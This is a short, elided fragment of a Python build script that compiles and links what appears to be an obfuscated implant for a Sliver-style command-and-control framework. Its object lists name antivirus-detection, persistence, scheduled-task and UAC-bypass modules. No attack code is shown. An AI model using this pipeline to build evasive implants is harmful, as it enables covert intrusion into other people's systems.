...
lld_args = ['lld-link', '/debug', '/SUBSYSTEM:CONSOLE', '/machine:X64', '/dynamicbase:no', '/incremental:no', '/libpath:"C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.22621.0\\um\\x64\\"', 'main.obj', 'Sliver.obj', 'Handler.obj', 'sspi.obj', 'Utils.lib', 'Communication.lib']
...
for dir in targeted_dir:
    for file in os.listdir(dir):
        if file.endswith(".c"):
            ...
            subprocess.run(llc_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

os.chdir('.\\build\\obfuscated-build')
utils_lib = ['Utils.obj', 'AVDetection.obj', 'Cryptography.obj', 'Curve25519.obj', 'EventSink.obj', 'Filesystem.obj', 'Gui.obj', 'Hash.obj', 'Image.obj', 'Persistence.obj', 'Process.obj', 'Protobuf.obj', 'Random.obj', 'Registry.obj', 'ScheduledTask.obj', 'Service.obj', 'StringHelper.obj', 'SystemInfo.obj', 'Time.obj', 'UACBypass.obj', 'Wmi.obj']
